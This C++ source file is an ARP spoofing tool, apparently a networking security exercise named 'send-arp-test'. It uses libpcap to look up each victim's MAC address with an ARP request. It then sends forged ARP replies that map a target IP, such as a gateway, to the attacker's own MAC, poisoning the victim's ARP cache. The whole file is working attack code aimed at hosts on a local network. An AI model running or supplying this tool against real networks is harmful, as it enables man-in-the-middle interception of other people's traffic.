#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <pcap.h>
#include <vector>
#include <map>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

using namespace std;

char* get_my_MAC(const char* iface) {
    int fd;
    struct ifreq ifr;
    unsigned char *mac = NULL;
    memset(&ifr, 0, sizeof(ifr));
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr)) {
        mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
	}
    close(fd);
	char* mac_p=(char*)malloc(18);
	snprintf(mac_p,18,"%02x:%02x:%02x:%02x:%02x:%02x",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
    return mac_p;
}
char* get_my_IP(const char *iface) {
    	int fd;
    	struct ifreq ifr;
    	static char ip[INET_ADDRSTRLEN]; // IP 주소를 저장할 버퍼
    	fd = socket(AF_INET, SOCK_DGRAM, 0);
    	if (fd < 0) {
        	perror("socket");
        	return NULL;
   	 }
   	 memset(&ifr, 0, sizeof(ifr));
   	 ifr.ifr_addr.sa_family = AF_INET;
   	 strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
   	 if (ioctl(fd, SIOCGIFADDR, &ifr) == 0) {
       		 struct sockaddr_in *ipaddr = (struct sockaddr_in *)&ifr.ifr_addr;
       		 inet_ntop(AF_INET, &ipaddr->sin_addr, ip, sizeof(ip));
   	 } else {
        perror("ioctl");
        close(fd);
        return NULL;
    }
    close(fd);
    return ip;
 }


Mac get_sender_MAC(pcap_t* handle,char* dev,Ip s_IP, Ip m_IP, Mac m_MAC){
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = m_MAC;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = m_MAC;
	packet.arp_.sip_ = htonl(m_IP);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(s_IP);

	int res= pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "1pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return Mac("00:00:00:00:00:00");
	}
	struct pcap_pkthdr* header;
	const u_char* pkt_data;
	while(1){
		res=pcap_next_ex(handle, &header, &pkt_data);
		if(res==0){
			continue;
		}
		struct EthHdr* res_eth_packet=(struct EthHdr*)pkt_data;
        struct ArpHdr* res_arp_packet=(struct ArpHdr*)(pkt_data+sizeof(EthHdr));

		if(res_eth_packet->type()==EthHdr::Arp&&res_arp_packet->op()==ArpHdr::Reply&&res_arp_packet->sip()==Ip(s_IP)){
			Mac sender_mac = Mac(res_eth_packet->smac_);
			const uint8_t* mac_addr=(const uint8_t*)sender_mac;
			for(int i=0;i<6;i++){
				printf("%02x",mac_addr[i]);
				printf(":");
			}
			return sender_mac;
		}	
	}
}

void spoofing(pcap_t* handle,char* dev, Mac s_MAC,Mac m_MAC,Ip s_IP, Ip t_IP){
	EthArpPacket packet;

	packet.eth_.dmac_ = s_MAC;
	packet.eth_.smac_ = m_MAC;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = m_MAC;
	packet.arp_.sip_ = htonl(t_IP);
	packet.arp_.tmac_ = s_MAC;
	packet.arp_.tip_ = htonl(s_IP);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "3pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

}

void usage() {
	printf("syntax: send-arp-test <interface> <ip1> <1p2>\n");
	printf("sample: send-arp-test wlan0 192.168.10.1 192.168.10.3 \n");
}

int main(int argc, char* argv[]) {
	if (argc%2 != 0||argc==2) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	map<Ip,Mac> ipmap=map<Ip,Mac>();
	char* mac=get_my_MAC(dev);
	Mac my_MAC=Mac(mac);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1,errbuf);
	if(handle==nullptr){
		fprintf(stderr,"couldn't open device %s(%s)\n",dev,errbuf);
		return -1;
	}
	char* my_ip=get_my_IP(dev);
	Ip my_IP=Ip(my_ip);
	for(int i=1;i<argc/2;i++){
		Ip send_IP(argv[i*2]);
		Ip tar_IP(argv[i*2+1]);
		Mac send_MAC;
		if(ipmap.find(send_IP)!=ipmap.end()){
			send_MAC =ipmap[send_IP];
		}else{
			send_MAC=get_sender_MAC(handle,dev,send_IP,my_IP,my_MAC);
			ipmap[send_IP]=send_MAC;
		}
		spoofing(handle,dev,send_MAC,my_MAC,send_IP,tar_IP);
	}
	return 0;
}
